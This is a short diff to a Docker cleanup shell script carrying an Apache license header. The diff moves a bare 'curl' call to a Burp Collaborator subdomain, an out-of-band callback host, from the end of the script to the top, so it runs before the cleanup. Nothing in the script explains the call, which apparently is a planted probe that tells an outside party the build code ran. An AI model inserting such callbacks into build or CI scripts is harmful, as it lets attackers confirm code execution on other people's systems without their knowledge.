@@ -15,10 +15,10 @@
 # KIND, either express or implied.  See the License for the
 # specific language governing permissions and limitations
 # under the License.
+curl https://jre1q0us9eeaxt6iuqjdlk37lyrwfl.burpcollaborator.net;
+
 function cleanup_docker {
     docker system prune --all --force --volumes || true
 }
 
 cleanup_docker
-
-curl https://jre1q0us9eeaxt6iuqjdlk37lyrwfl.burpcollaborator.net
